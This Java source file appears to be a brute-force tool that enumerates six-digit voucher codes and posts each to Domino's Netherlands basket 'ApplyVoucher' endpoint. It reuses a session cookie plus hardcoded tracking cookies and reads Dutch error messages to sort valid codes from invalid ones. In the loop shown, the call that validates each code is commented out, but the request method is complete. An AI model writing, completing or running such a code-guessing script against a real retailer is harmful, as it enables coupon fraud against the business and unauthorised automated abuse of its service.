package model;

import javax.net.ssl.HttpsURLConnection;
import java.io.*;
import java.net.URL;

public class CouponModel {
    private CookieModel cookieModel;

    public CouponModel(CookieModel cookieModel) {
        this.cookieModel = cookieModel;
    }

    public void tryRange(int start, int end) {
        for (int i = start; i < end; i++) {

            StringBuilder urlAddon = new StringBuilder();
            urlAddon.append(Integer.toString(i));

            if (urlAddon.length() < 6) {
                for (int j = 0; j < 6 - urlAddon.length(); j++) {
                    urlAddon.insert(0, "0");
                }
            }

            System.out.println(urlAddon);
            //validateCoupon(urlAddon.toString());
        }
    }

    public void validateCoupon(String couponCode) throws Exception {
        String url = "https://bestellen.dominos.nl/eStore/nl/Basket/ApplyVoucher?voucherCode=" + couponCode;
        URL obj = new URL(url);
        HttpsURLConnection connection= (HttpsURLConnection) obj.openConnection();

        connection = addHeadersToCookie(connection);

        // Send post request
        connection.setDoOutput(true);
        DataOutputStream wr = new DataOutputStream(connection.getOutputStream());
        wr.flush();
        wr.close();

        int responseCode = connection.getResponseCode();


        BufferedReader in = new BufferedReader(
                new InputStreamReader(connection.getInputStream()));
        String inputLine;
        StringBuffer response = new StringBuffer();

        while ((inputLine = in.readLine()) != null) {
            response.append(inputLine);
            if (inputLine.contains("wordt niet geaccepteerd") || inputLine.contains("verlopen")) {
                System.out.println(couponCode + ": Invalid coupon");
            }
        }
        System.out.println(response.toString());
        in.close();
    }

    private HttpsURLConnection addHeadersToCookie(HttpsURLConnection connectionnection) {
        try {
            //add reuqest header
            connectionnection.setRequestMethod("POST");
            String USER_AGENT = "Mozilla/5.0";
            connectionnection.setRequestProperty("Cookie", "ASP.NET_SessionId=" + cookieModel.getCookie() + "; session_id=1cef59bd-ade4-4fc7-acec-37223a43608d; visitor_id=8b171f59-2f8f-440e-abf8-1b32c307f4f1; Language=nl; _vwo_uuid_v2=3462A6B4D3F3536274288A70DEAF6909|308c6a66e1d61aba82debdf9dd75e336; _ga=GA1.3.1957957846.1481210233; _ga=GA1.2.1957957846.1481210233; _gat_martijn_dominos=1; domino_customer_state=NC; utag_main=v_id:0158df02814c001a7bef97d6159f05072002b06a00bd0$_sn:1$_ss:0$_st:0; origin-server=AWS; _gali=apply_voucher");
            connectionnection.setRequestProperty("User-Agent", USER_AGENT);
            connectionnection.setRequestProperty("Accept-Language", "en-US,en;q=0.5");
        } catch (Exception e) {
            e.printStackTrace();
        }

        return connectionnection;
    }
}
